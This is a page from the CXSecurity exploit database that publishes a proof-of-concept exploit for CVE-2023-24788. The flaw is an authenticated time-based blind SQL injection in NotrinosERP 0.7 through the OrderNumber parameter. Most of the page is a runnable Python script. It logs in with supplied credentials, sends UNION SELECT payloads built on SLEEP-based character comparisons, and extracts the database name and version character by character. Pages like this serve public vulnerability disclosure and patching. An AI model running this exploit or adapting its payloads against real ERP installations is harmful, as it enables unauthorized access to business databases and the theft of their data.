---
title: NotrinosERP 0.7 SQL Injection
url: https://cxsecurity.com/issue/WLB-2023040039
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-04-11
fetch_date: 2025-10-04T11:29:23.699308
---

# NotrinosERP 0.7 SQL Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **NotrinosERP 0.7 SQL Injection** **2023.04.10**  Credit:  **[Arvandy](https://cxsecurity.com/author/Arvandy/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2023-24788](https://cxsecurity.com/cveshow/CVE-2023-24788/ "Click to see CVE-2023-24788")**  CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")** | |

# Exploit Title: NotrinosERP 0.7 - Authenticated Blind SQL Injection
# Date: 11-03-2023
# Exploit Author: Arvandy
# Blog Post: https://github.com/arvandy/CVE/blob/main/CVE-2023-24788/CVE-2023-24788.md
# Software Link: https://github.com/notrinos/NotrinosERP/releases/tag/0.7
# Vendor Homepage: https://notrinos.com/
# Version: 0.7
# Tested on: Windows, Linux
# CVE: CVE-2023-24788
"""
The endpoint /sales/customer\_delivery.php is vulnerable to Authenticated Blind SQL Injection (Time-based) via the GET parameter OrderNumber.
This endpoint can be triggered through the following menu: Sales - Sales Order Entry - Place Order - Make Delivery Against This Order.
The OrderNumber parameter require a valid orderNumber value.
This script is created as Proof of Concept to retrieve database name and version through the Blind SQL Injection that discovered on the application.
"""
import sys, requests
def injection(target, inj\_str, session\_cookies):
for j in range(32, 126):
url = "%s/sales/customer\_delivery.php?OrderNumber=%s" % (target, inj\_str.replace("[CHAR]", str(j)))
headers = {'Content-Type':'application/x-www-form-urlencoded','Cookie':'Notrinos2938c152fda6be29ce4d5ac3a638a781='+str(session\_cookies)}
r = requests.get(url, headers=headers)
res = r.text
if "NotrinosERP 0.7 - Login" in res:
session\_cookies = login(target, username, password)
headers = {'Content-Type':'application/x-www-form-urlencoded','Cookie':'Notrinos2938c152fda6be29ce4d5ac3a638a781='+str(session\_cookies)}
r = requests.get(url, headers=headers)
elif (r.elapsed.total\_seconds () > 2 ):
return j
return None
def login(target, username, password):
target = "%s/index.php" % (target)
headers = {'Content-Type': 'application/x-www-form-urlencoded'}
data = "user\_name\_entry\_field=%s&password=%s&company\_login\_name=0" % (username, password)
s = requests.session()
r = s.post(target, data = data, headers = headers)
return s.cookies.get('Notrinos2938c152fda6be29ce4d5ac3a638a781')
def retrieveDBName(session\_cookies):
db\_name = ""
print("(+) Retrieving database name")
for i in range (1,100):
injection\_str = "15+UNION+SELECT+IF(ASCII(SUBSTRING((SELECT+DATABASE()),%d,1))=[CHAR],SLEEP(2),null)-- -" % i
retrieved\_value = injection(target, injection\_str, session\_cookies)
if (retrieved\_value):
db\_name += chr(retrieved\_value)
else:
break
print("Database Name: "+db\_name)
def retrieveDBVersion(session\_cookies):
db\_version = ""
print("(+) Retrieving database version")
for i in range (1,100):
injection\_str = "15+UNION+SELECT+IF(ASCII(SUBSTRING((SELECT+@@version),%d,1))=[CHAR],SLEEP(2),null)-- -" % i
retrieved\_value = injection(target, injection\_str, session\_cookies)
if (retrieved\_value):
db\_version += chr(retrieved\_value)
sys.stdout.flush()
else:
break
print("Database Version: "+db\_version)
def main():
print("(!) Login to the target application")
session\_cookies = login(target, username, password)
print("(!) Exploiting the Blind Auth SQL Injection to retrieve database name and versions")
retrieveDBName(session\_cookies)
print("")
retrieveDBVersion(session\_cookies)
if \_\_name\_\_ == "\_\_main\_\_":
if len(sys.argv) != 4:
print("(!) Usage: python3 exploit.py <URL> <username> <password>")
print("(!) E.g.,: python3 exploit.py http://192.168.1.100/NotrinosERP user pass")
sys.exit(-1)
target = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]
main()

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023040039)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top